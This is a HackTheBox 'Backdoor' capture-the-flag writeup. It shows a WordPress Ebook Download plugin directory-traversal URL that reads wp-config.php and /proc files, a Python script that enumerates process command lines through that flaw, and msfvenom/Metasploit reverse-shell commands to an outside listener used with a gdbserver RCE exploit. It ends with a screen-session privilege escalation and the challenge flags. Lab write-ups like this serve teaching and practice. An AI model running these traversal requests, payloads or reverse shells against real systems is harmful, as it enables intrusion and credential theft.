# Backdoor - HackTheBox - Writeup
Linux, 20 Base Points, Easy

![info.JPG](images/info.JPG)

## Machine

![‏‏Backdoor.JPG](images/Backdoor.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22```, ```80``` and ```1337```.

***User***: By running ```wpscan``` we found LFI vulnerability on ```Ebook``` PHP  plugin, Using that we can get the file ```/proc/sched_debug``` which contains running tasks and PIDs, Using the LFI we can enumerate the ```/proc/{PID}/cmdline ``` for each PID, By reading the ```cmdline``` of PID ```817``` we found that port 1337 contains ```gdbserver``` with RCE vulnerability, using that we get a reverse shell as ```user```.

***Root***: Found ```root``` screen, Attaching to the root session by running ```screen -x root/root```.

![pwn.JPG](images/pwn.JPG)


## Backdoor Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Backdoor]
└──╼ $ nmap -sV -sC -oA nmap/Backdoor 10.10.11.125
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-25 22:56 IST
Nmap scan report for 10.10.11.125
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_https-redirect: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
1337/tcp closed waste


```

By observing port 80 we get the following web page:

![port80.JPG](images/port80.JPG)

By running ```gobuster``` we can see the following result:
```console
┌─[evyatar@parrot]─[/hackthebox/Backdoor]
└──╼ $ gobuster dir -u http://10.10.11.125/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -k --wildcard -s 401,403,200 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.125/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/25 22:57:28 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.11.125/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.11.125/wp-includes/]
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.11.125/wp-admin/]   
/server-status        (Status: 403) [Size: 277]                                       
                                                                           
```

As we can see It's WordPress, Let's run ```wpscan```:
```console
┌─[evyatar@parrot]─[/hackthebox/Backdoor]
└──╼ $ wpscan --api-token $WPSCAN_KEY --url http://backdoor.htb/ --plugins-detection mixed -e -t 100
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.4
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://backdoor.htb/ [10.10.11.125]
[+] Started: Fri Nov 26 00:41:13 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://backdoor.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

........

[+] ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Ebook Download < 1.2 - Directory Traversal
 |     Fixed in: 1.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/13d5d17a-00a8-441e-bda1-2fd2b4158a6c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10924
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
....
```

We can see that we have ```Ebook Download < 1.2 - Directory Traversal``` vulnerability.

Let's use it by the following [https://www.exploit-db.com/exploits/39575](https://www.exploit-db.com/exploits/39575).

We can get the ```wp-config.php``` file by access to [http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php](http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php):
```php
../../../wp-config.php../../../wp-config.php../../../wp-config.php<?php

...
/** The name of the database for WordPress */

define( 'DB_NAME', 'wordpress' );

/** MySQL database username */

define( 'DB_USER', 'wordpressuser' );


/** MySQL database password */

define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );


/** MySQL hostname */

define( 'DB_HOST', 'localhost' );

...

```

Those credentials are not worked with WordPress log in.

Let's move to port ```1337```, We need to know which process running behind this port.

To do so we need to enumerate the PIDs on the target system.

We can get a list of running PID by getting the file ```/proc/sched_debug``` from the URL: [http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/sched_debug](http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/sched_debug):
```console
...
runnable tasks:
 S           task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-----------------------------------------------------------------------------------------------------------
 I         rcu_gp     3        13.968293         2   100         0.000000         0.003980         0.000000 0 0 /
 I     rcu_par_gp     4        15.968373         2   100         0.000000         0.002120         0.000000 0 0 /
 I   kworker/0:0H     6      2818.689658         4   100         0.000000         0.025240         0.000000 0 0 /
 I   mm_percpu_wq     9        22.039191         2   100         0.000000         0.002590         0.000000 0 0 /
 S    ksoftirqd/0    10     31380.765382      2270   120         0.000000        73.079540         0.000000 0 0 /
 I      rcu_sched    11     31387.989732    376748   120         0.000000      4438.355970         0.000000 0 0 /
 S    migration/0    12         0.000000      4362     0         0.000000        68.211470         0.000000 0 0 /
 S  idle_inject/0    13         0.000000         3    49         0.000000         0.005920         0.000000 0 0 /
 S        cpuhp/0    14      6933.896021         9   120         0.000000         0.069010         0.000000 0 0 /
 S  irq/24-pciehp    94         0.000000         3    49         0.000000         0.037060         0.000000 0 0 /
 S  irq/26-pciehp    96         0.000000         3    49         0.000000         0.054280         0.000000 0 0 /
 S  irq/28-pciehp    98         0.000000         3    49         0.000000         0.035620         0.000000 0 0 /
 S  irq/30-pciehp   100         0.000000         3    49         0.000000         0.053620         0.000000 0 0 /
 S  irq/32-pciehp   102         0.000000         3    49         0.000000         0.031990         0.000000 0 0 /
 S  irq/34-pciehp   104         0.000000         3    49         0.000000         0.053700         0.000000 0 0 /
 S  irq/36-pciehp   106         0.000000         3    49         0.000000         0.039600         0.000000 0 0 /
 S  irq/38-pciehp   108         0.000000         3    49         0.000000         0.054750         0.000000 0 0 /
 S  irq/40-pciehp   110         0.000000         3    49         0.000000         0.053390         0.000000 0 0 /
 S  irq/42-pciehp   112         0.000000         3    49         0.000000         0.053420         0.000000 0 0 /
 S  irq/44-pciehp   114         0.000000         3    49         0.000000         0.054070         0.000000 0 0 /
 S  irq/46-pciehp   116         0.000000         3    49         0.000000         0.053530         0.000000 0 0 /
 S  irq/48-pciehp   118         0.000000         3    49         0.000000         0.059000         0.000000 0 0 /
 S  irq/50-pciehp   120         0.000000         3    49         0.000000         0.053380         0.000000 0 0 /
 S  irq/52-pciehp   122         0.000000         3    49         0.000000         0.054660         0.000000 0 0 /
 S  irq/54-pciehp   124         0.000000         3    49         0.000000         0.054590         0.000000 0 0 /
 I kworker/u257:0   146       919.183306         2   100         0.000000         0.002410         0.000000 0 0 /
 Icharger_manager   159       982.051234         2   100         0.000000         0.010600         0.000000 0 0 /
 I     mpt_poll_0   199      1384.186790         2   100         0.000000         0.010320         0.000000 0 0 /
 I     scsi_tmf_2   202      2417.477558         2   100         0.000000         0.009180         0.000000 0 0 /
 S      scsi_eh_3   203      2788.236776        26   120         0.000000         0.703740         0.000000 0 0 /
 I     scsi_tmf_3   205      2449.725841         2   100         0.000000         0.006330         0.000000 0 0 /
 I       ttm_swap   209      2479.127093         2   100         0.000000         0.004850         0.000000 0 0 /
 I     scsi_tmf_5   211      2516.975534         2   100         0.000000         0.007190         0.000000 0 0 /
 S      scsi_eh_6   212      2788.210316        26   120         0.000000         0.511820         0.000000 0 0 /
 I     scsi_tmf_6   213      2501.184097         2   100         0.000000         0.003090         0.000000 0 0 /
 I     scsi_tmf_7   215      2509.185621         2   100         0.000000         0.002270         0.000000 0 0 /
 I     scsi_tmf_8   217      2517.187265         2   100         0.000000         0.006320         0.000000 0 0 /
 I     scsi_tmf_9   219      2524.377763         2   100         0.000000         0.004130         0.000000 0 0 /
 I    scsi_tmf_10   221      2532.373346         2   100         0.000000         0.003880         0.000000 0 0 /
 I    scsi_tmf_11   223      2540.369236         2   100         0.000000         0.003750         0.000000 0 0 /
 I    scsi_tmf_12   225      2548.365251         2   100         0.000000         0.003660         0.000000 0 0 /
 I    scsi_tmf_13   227      2556.361283         2   100         0.000000         0.003840         0.000000 0 0 /
 S     scsi_eh_14   228      2805.916957        26   120         0.000000         0.922560         0.000000 0 0 /
 I    scsi_tmf_14   229      2564.357268         2   100         0.000000         0.003780         0.000000 0 0 /
 S     scsi_eh_15   230      2805.548567        26   120         0.000000         0.584320         0.000000 0 0 /
 I    scsi_tmf_15   231      2572.353384         2   100         0.000000         0.003980         0.000000 0 0 /
 I    scsi_tmf_16   233      2580.348969         2   100         0.000000         0.004140         0.000000 0 0 /
 I    scsi_tmf_17   235      2588.344158         2   100         0.000000         0.004330         0.000000 0 0 /
 I    scsi_tmf_18   237      2596.339326         2   100         0.000000         0.004240         0.000000 0 0 /
 I    scsi_tmf_19   239      2604.334592         2   100         0.000000         0.003840         0.000000 0 0 /
 S     scsi_eh_20   240      2788.256166        26   120         0.000000         0.569150         0.000000 0 0 /
 I    scsi_tmf_20   241      2612.330600         2   100         0.000000         0.004310         0.000000 0 0 /
 I    scsi_tmf_21   243      2620.334093         2   100         0.000000         0.004880         0.000000 0 0 /
 I         cryptd   255      2637.259068         2   100         0.000000         0.008060         0.000000 0 0 /
 S     scsi_eh_24   259      2788.249366        26   120         0.000000         0.578080         0.000000 0 0 /
 S     scsi_eh_25   261      2788.304666        26   120         0.000000         0.626180         0.000000 0 0 /
 I    scsi_tmf_25   264      2661.613516         2   100         0.000000         0.008050         0.000000 0 0 /
 I    scsi_tmf_26   269      2672.549835         2   100         0.000000         0.006730         0.000000 0 0 /
 S     scsi_eh_27   272      2805.929157        26   120         0.000000         0.931290         0.000000 0 0 /
 I    scsi_tmf_27   273      2685.996059         2   100         0.000000         0.005600         0.000000 0 0 /
 S     scsi_eh_29   292      2788.260816        26   120         0.000000         0.573400         0.000000 0 0 /
 I    scsi_tmf_32   327      2811.121947         2   100         0.000000         0.023850         0.000000 0 0 /
 I   kworker/0:1H   328     31381.324299      7247   100         0.000000       151.690360         0.000000 0 0 /
 I       kdmflush   341      2849.470355         2   100         0.000000         0.025850         0.000000 0 0 /
 S    jbd2/dm-0-8   430     31381.469269     13418   120         0.000000       395.634690         0.000000 0 0 /
 Ssystemd-journal   486      1932.958288     15343   119         0.000000      3707.362450         0.000000 0 0 /autogroup-3
 S  systemd-udevd   514      1892.985547      2396   120         0.000000       416.669690         0.000000 0 0 /autogroup-15
 Ssystemd-network   516        61.061744      1329   120         0.000000       784.660280         0.000000 0 0 /autogroup-16
 S     multipathd   656         0.000000     20137     0         0.000000       416.269560         0.000000 0 0 /autogroup-24
 S     multipathd   658         0.000000         1     0         0.000000         0.325420         0.000000 0 0 /autogroup-24
 S     multipathd   659         0.000000       562     0         0.000000        20.443510         0.000000 0 0 /autogroup-24
 S    jbd2/sda2-8   664      8866.973313        14   120         0.000000         0.257520         0.000000 0 0 /
 Iext4-rsv-conver   665      6961.541411         2   100         0.000000         0.005160         0.000000 0 0 /
 S       vmtoolsd   765       863.217701       145   120         0.000000         0.747470         0.000000 0 0 /autogroup-36
 S          gmain   933       863.217841       147   120         0.000000         1.282340         0.000000 0 0 /autogroup-36
 Saccounts-daemon   750        14.131746        59   120         0.000000         9.425080         0.000000 0 0 /autogroup-37
 S    dbus-daemon   751        33.264574       311   120         0.000000        47.430250         0.000000 0 0 /autogroup-38
 S     irqbalance   757       700.273394      1690   120         0.000000       704.403350         0.000000 0 0 /autogroup-41
 S          gmain   760         6.635548         1   120         0.000000         0.028070         0.000000 0 0 /autogroup-41
 S       rsyslogd   762       246.286213        55   120         0.000000         6.880110         0.000000 0 0 /autogroup-43
 S    in:imuxsock   769       253.981973      7246   120         0.000000       305.882770         0.000000 0 0 /autogroup-43
 S systemd-logind   763        43.157104       380   120         0.000000        76.068960         0.000000 0 0 /autogroup-44
 S           cron   794         3.129742        36   120         0.000000         2.215710         0.000000 0 0 /autogroup-52
 S           cron   795         3.136712        39   120         0.000000         2.222680         0.000000 0 0 /autogroup-52
 S             sh   817         0.499356         3   120         0.000000         0.902130         0.000000 0 0 /autogroup-57
 S           sshd   827        58.707925        77   120         0.000000        19.936730         0.000000 0 0 /autogroup-65
 S        apache2   846      1030.577005     16879   120         0.000000      1043.088970         0.000000 0 0 /autogroup-71
 S         agetty   851        -3.769886        12   120         0.000000         3.504020         0.000000 0 0 /autogroup-84
 S        polkitd   894         4.232294        33   120         0.000000         5.605680         0.000000 0 0 /autogroup-76
 S           bash   932        19.637674        75   120         0.000000        18.265700         0.000000 0 0 /autogroup-79
 S         mysqld   974      3494.478481       645   120         0.000000       922.856190         0.000000 0 0 /autogroup-80
 S     ib_io_ibuf  1005      3573.747011     33480   120         0.000000       370.768490         0.000000 0 0 /autogroup-80
 S      ib_io_log  1006      3573.711581     33480   120         0.000000       324.472900         0.000000 0 0 /autogroup-80
 S     ib_io_rd-2  1008      3573.730491     33479   120         0.000000       310.706960         0.000000 0 0 /autogroup-80
 S     ib_io_wr-1  1011      3573.726951     33492   120         0.000000       386.858540         0.000000 0 0 /autogroup-80
 S     ib_io_wr-4  1014      3573.735901     33502   120         0.000000       390.341620         0.000000 0 0 /autogroup-80
 S ib_pg_flush_co  1015      3578.050631     16783   120         0.000000       759.312680         0.000000 0 0 /autogroup-80
 S ib_log_checkpt  1016      3577.150291     16768   120         0.000000       661.960480         0.000000 0 0 /autogroup-80
 S  ib_buf_resize  1046       990.149855         1   120         0.000000         0.038040         0.000000 0 0 /autogroup-80
 S   xpl_worker-1  1051      3572.051001       312   120         0.000000        10.181410         0.000000 0 0 /autogroup-80
 S    ib_buf_dump  1056      1029.049561         9   120         0.000000         0.604820         0.000000 0 0 /autogroup-80
 S   ib_srv_wkr-3  1061      3495.106541       315   120         0.000000        11.932560         0.000000 0 0 /autogroup-80
 S    sig_handler  1063      1054.584837         2   120         0.000000         0.111040         0.000000 0 0 /autogroup-80
 S   xpl_accept-2  1064      3577.624401     16765   120         0.000000       653.366080         0.000000 0 0 /autogroup-80
 S     connection  1496      1232.121121       459   120         0.000000        89.216300         0.000000 0 0 /autogroup-80
 S     connection  1497      1234.564501       551   120         0.000000        95.413620         0.000000 0 0 /autogroup-80
 S     connection  1843      3497.187071       174   120         0.000000        34.220960         0.000000 0 0 /autogroup-80
 S           bash   980         0.079936         3   120         0.000000         1.242200         0.000000 0 0 /autogroup-82
 I    kworker/0:1 37261     31138.373955     10112   120         0.000000       921.662780         0.000000 0 0 /
 I kworker/u256:2 39934     31387.854132      2113   120         0.000000        58.617140         0.000000 0 0 /
 I    kworker/0:0 40376     31143.956751      4132   120         0.000000       389.929050         0.000000 0 0 /
 S        apache2 40411      1000.879811         7   120         0.000000         0.859630         0.000000 0 0 /autogroup-71
 I kworker/u256:0 41022     31375.067910      1277   120         0.000000        35.932630         0.000000 0 0 /
 I    kworker/0:2 41766     31388.248762      1467   120         0.000000       128.048880         0.000000 0 0 /
 S          sleep 42196    103386.860688         1   120         0.000000         0.755330         0.000000 0 0 /autogroup-59
>R  systemd-udevd 42197      1901.156773         0   120         0.000000         0.000000         0.000000 0 0 /autogroup-15

...
```

So we have a list of PIDs:
```console
3
4
6
9
10
11
12
13
14
94
96
98
100
102
104
106
108
110
112
114
116
118
120
122
124
146
159
199
202
203
205
209
211
212
213
215
217
219
221
223
225
227
228
229
230
231
233
235
237
239
240
241
243
255
259
261
264
269
272
273
292
327
328
341
430
486
514
516
656
658
659
664
665
765
933
750
751
757
760
762
769
763
794
795
817
827
846
851
894
932
974
1005
1006
1008
1011
1014
1015
1016
1046
1051
1056
1061
1063
1064
1496
1497
1843
980
37261
39934
40376
40411
41022
41766
42196
42197
```

Let's write a python script to get the ```/proc/{PID}/cmdline``` which this file shows the parameters passed to the process at the time it is started:
```python
import urllib.request

PREFIX_URL="http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="
RUNNABLE_TASK_FILE="../../../../../../proc/{PID}/cmdline"


with open('pids') as p:
    pids = p.readlines()
    for pid in pids:
        pid=pid.rstrip()
        f = urllib.request.urlopen(f"{PREFIX_URL}{RUNNABLE_TASK_FILE.replace('{PID}',pid)}")
        print(f"cmdline of {pid}: {str(f.read())}")
```

By running that we get:
```console
...
cmdline of 817: b'../../../../../../proc/817/cmdline../../../../../../proc/817/cmdline../../../../../../proc/817/cmdline/bin/sh\x00-c\x00while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done\x00<script>window.close()</script>'
...
cmdline of 980: b'../../../../../../proc/980/cmdline../../../../../../proc/980/cmdline../../../../../../proc/980/cmdlinebash\x00-c\x00cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\x00<script>window.close()</script>'

```

We can see It's running the file ```/home/user/gdbserver``` as ```user``` with arguments ```--once 0.0.0.0:1337```.

We can use the following [https://www.exploit-db.com/exploits/50539](https://www.exploit-db.com/exploits/50539) to get RCE:
```console
┌─[evyatar@parrot]─[/hackthebox/Backdoor]
└──╼ $ msfvenom -p linux/x64/meterpreter/reverse_tcp  LHOST=10.10.14.14 LPORT=4444 PrependFork=true -o rev.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 162 bytes
Saved as: rev.bin

```

Create a listener using ```metasploit```:
```console
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit -j -Z

```

Run the exploit:
```console
┌─[evyatar@parrot]─[/hackthebox/Backdoor]
└──╼ $ python3 exp.py backdoor.htb:1337 rev.bin 
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener

```

And we get a reverse shell:
```console
meterpreter > shell
Process 46858 created.
Channel 1 created.
pwd  
/home/user
cat user.txt
46bd078c72171dfe348df0c97e1dafaf

```

And we get the user flag ```46bd078c72171dfe348df0c97e1dafaf```.


### Root

By running [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) we found the following process:
```console
...
root         816  0.0  0.0   2608  1840 ?        Ss   Nov26   0:05      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
...
```

There is a screen session named root and owned by root. 

First, Let's create a terminal type using ```export TERM=xterm```, Next access to the root screen:
```console
user@Backdoor:/tmp$ export TERM=xterm
export TERM=xterm
user@Backdoor:/tmp$screen -x root/root
root@Backdoor:~# id && hostname && whoami
id && hostname && whoami
uid=0(root) gid=0(root) groups=0(root)
Backdoor
root
root@Backdoor:~# cat root.txt
cat root.txt
49235e91e9794093e0ed1b1c65dbd7c9
root@Backdoor:~# 

```

And we get the user flag ```49235e91e9794093e0ed1b1c65dbd7c9```.